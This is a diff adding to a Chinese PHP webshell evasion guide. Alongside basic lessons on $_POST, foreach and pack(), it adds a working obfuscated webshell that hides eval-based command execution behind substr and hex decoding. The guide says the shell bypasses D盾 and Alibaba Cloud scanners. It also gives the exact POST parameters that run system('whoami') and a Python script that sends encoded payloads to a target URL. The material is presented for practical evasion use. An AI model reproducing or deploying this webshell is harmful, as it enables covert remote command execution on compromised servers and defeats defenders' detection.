@@ -2,7 +2,7 @@
 
 ![WebShell-Bypass-Guide](https://socialify.git.ci/AabyssZG/WebShell-Bypass-Guide/image?description=1&font=Jost&forks=1&issues=1&language=1&logo=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F54609266%3Fv%3D4&name=1&owner=1&pattern=Floating%20Cogs&stargazers=1&theme=Dark)
 
-**手册版本号：V1.2-20230610**
+**手册版本号：V1.3-20230807**
 
 这是一本能让你从零开始学习PHP的WebShell免杀的手册，同时我会在内部群迭代更新
 
@@ -207,6 +207,30 @@ __METHOD__     //当前所属的方法
 ```
 第三种和第四种为短标识，当使用他们需要开启 `php.ini` 文件中的 `short_open_tag` ，不然会报错
 
+### 0.8 $_POST变量
+
+在 PHP 中，预定义的 `$_POST` 变量用于收集来自 `method="post"` 的表单中的值
+
+```php
+$num1=$_POST['num1'];
+$num2=$_POST['num2'];
+print_r($_POST);
+```
+
+当你在HTTP数据包Body传参时：
+```php
+num1=1&num2=2
+```
+
+得到回显：
+```php
+Array
+(
+    [num1] => 1
+    [num2] => 2
+)
+```
+
 
 ## 1# 回调类型函数
 
@@ -335,6 +359,35 @@ print_r(array_filter($a1,"test_odd"));
 Array ( [3] => 3 )
 ```
 
+### 1.5 foreach()
+
+**`foreach()` 方法用于调用数组的每个元素，并将元素传递给回调函数**
+
+foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。
+
+Demo：
+
+```php
+$arr = array(1,2,3,4);
+//用foreach来处理$arr
+foreach($arr as $k=>$v) {
+    $arr[$k] = 2 * $v;
+}
+print_r($arr);
+```
+
+输出：
+
+```php
+Array
+(
+    [0] => 2
+    [1] => 4
+    [2] => 6
+    [3] => 8
+)
+```
+
 
 ## 2# 字符串处理类函数
 
@@ -424,6 +477,18 @@ parse_str("name=Peter&age=43",$myArray);
 print_r($myArray);       //Array ( [name] => Peter [age] => 43 )
 ```
 
+### 2.4 pack()
+
+**`pack()` 函数函数把数据装入一个二进制字符串**
+
+Demo：简单来说，就是将指定编码的数字转成字符串
+
+```php
+echo pack("C3",80,72,80);   //ASCII编码转换为PHP
+echo pack("H*",4161627973735465616d);    //16进制编码转换为AabyssTeam
+```
+
+其他参数请参考菜鸟教程： [https://www.runoob.com/php/func-misc-pack.html](https://www.runoob.com/php/func-misc-pack.html)
 
 
 ## 3# 命令执行类函数
@@ -1295,6 +1360,133 @@ system('whoami');
 ![魔改连接哥斯拉.png](https://blog.zgsec.cn/usr/uploads/2023/06/432722789.png)
 
 当然这里使用到 `assert` 高危函数，只能用于 `php` 在 `5.*` 的版本，相关姿势读者不妨自行拓展一下哈哈~
+
+### 12.2 样例二
+
+这个免杀马是最近捕获到的，可以轻松过D盾、阿里云等一众查杀引擎~
+
+![ll0sxg0e.png](https://blog.zgsec.cn/usr/uploads/2023/08/3308306080.png)
+
+![ll0sx462.png](https://blog.zgsec.cn/usr/uploads/2023/08/3184468024.png)
+
+这个样例使用了字符串截取+编解码转换+参数回调的手法，成功规避了正则匹配式，具有实战意义
+
+```php
+<?php
+phpinfo();
+class Car{
+	function encode(){
+		$num1=base64_encode($_POST['num']);
+		$num=base64_decode($num1);
+		echo "1";
+		foreach($_POST as $k => $v){
+			$_POST[$k] = pack("H*",(substr($v,$num,-$num)));
+		}
+		@$post=base64_encode($_POST['Qxi*37yz']);
+		@$post1=base64_decode(@$post);
+		return $post1;
+	}
+	function Xt(){
+		return eval($this->encode());
+	}
+}
+$t=new Car;
+$t->Xt();
+?>
+```
+这时候，就可以执行POST传参：`num=2&Qxi*37yz=6173797374656d282777686f616d6927293b62` 来执行whoami命令
+
+这个PHP内定义了两个函数，分别是 `encode()` 和 `Xt()`，我们先看 `encode()`：
+
+```php
+function encode(){
+	$num1=base64_encode($_POST['num']);
+	$num=base64_decode($num1);
+	echo "1";
+	foreach($_POST as $k => $v){
+		$_POST[$k] = pack("H*",(substr($v,$num,-$num)));
+	}
+	@$post=base64_encode($_POST['Qxi*37yz']);
+	@$post1=base64_decode(@$post);
+	return $post1;
+}
+```
+传入了两个参数，参数名分别为 `num` 和 `Qxi*37yz`，这个函数的输出为 `$post1`，关键就在于以下这一行代码：
+
+```php
+foreach($_POST as $k => $v){
+	$_POST[$k] = pack("H*",(substr($v,$num,-$num)));
+}
+```
+然后我们根据上文提到的知识点0.8、1.5和2.1以及2.4，可以了解到这一行代码的意思：
+
+- `substr()` 函数将传进去的 `Qxi*37yz` 参数字符串，删掉前 `num` 个字符和后 `num` 个字符（截取中间部分的内容）
+- `pack("H*",...)` 函数将处理后的 `Qxi*37yz` 参数字符串进行十六进制编码转换
+- `foreach()` 将原本的 `$_POST` 变量替换为经过十六进制编码转换后的字符串
+
+注：这里可能有些绕，多上手尝试一下就明白了
+
+接下来我们来看 `Xt()` 这个函数：
+
+```php
+function Xt(){
+	return eval($this->encode());
+}
+```
+它将 `encode()` 函数的执行结果带入到 `eval()` 高危函数当中，即：
+
+```php
+function Xt(){
+	return eval($post1);  //encode()函数的输出为$post1
+}
+```
+那假设我们要执行 `whoami` 命令，那就要让 `$post1` 等于 `system('whoami');`，这没毛病吧？
+
+所以结合来看，我们先要生成16进制的字符串：
+
+![whoami转十六进制.png](https://blog.zgsec.cn/usr/uploads/2023/08/3506909610.png)
+
+但眼尖的师傅可能会发现，为什么最前面要加个 `a` 以及最后面要加个 `b` 呢？
+那是因为上面有 `substr()` 函数啊，会删掉前 `num` 个字符和后 `num` 个字符（截取中间部分的内容），小傻瓜~所以现在懂了吗？
+
+所以整体参数的传参流程如下：
+
+![参数传参流程.png](https://blog.zgsec.cn/usr/uploads/2023/08/4099814745.png)
+
+- 刚开始传入参数：`num`=`2`，`Qxi*37yz`=`6173797374656d282777686f616d6927293b62`
+- 第一步：先根据 `substr()`，从num=2开始截取到倒数第2位，于是 `Qxi*37yz` 便等于 `73797374656d282777686f616d6927293b`
+- 第二步：再根据 `pack("H*",...)`，将 `Qxi*37yz`=`73797374656d282777686f616d6927293b` 从16进制转为字符串即 `system('whoami');`
+- 第三步：最后根据 `foreach()`，将内容返还给原本的值，使得 `encode()` 函数的输出变量 `$post1` 为 `system('whoami');`
+- 第四步：再在 `Xt()` 函数当中，用 `eval()` 高危函数执行php语句 `system('whoami');`,便成功执行系统命令 `whoami`
+
+当然这个PHP木马也能用蚁剑来连接，前提是需要写一个编码器，如果你懂原理了，相信你分分钟就能写出来~
+
+这里的话，微信的 `@Elvery` 师傅还写了一个直接生成Payload一键传参的Python脚本，师傅们可以参考一下：
+```python
+import requests
+import base64
+
+# 指定num参数和要执行的PHP代码
+num = 5
+php_code = 'echo "Hello, world!";'
+
+# 把PHP代码转换为十六进制字符串
+hex_code = php_code.encode().hex()
+
+# 在字符串的开头和结尾加上num个任意字符
+encoded_code = 'a'*num + hex_code + 'a'*num
+
+# 发送POST请求
+response = requests.post('http://your-target-url/path-to-php-file.php', data={
+    'num': num,
+    'Qxi*37yz': encoded_code,
+})
+
+# 打印服务器的响应
+print(response.text)
+```
+
+![样例二成功执行命令.png](https://blog.zgsec.cn/usr/uploads/2023/08/2146327561.png)
 
 所以你学废了吗？更多有趣的WebShell免杀案例等我后续更新~
 
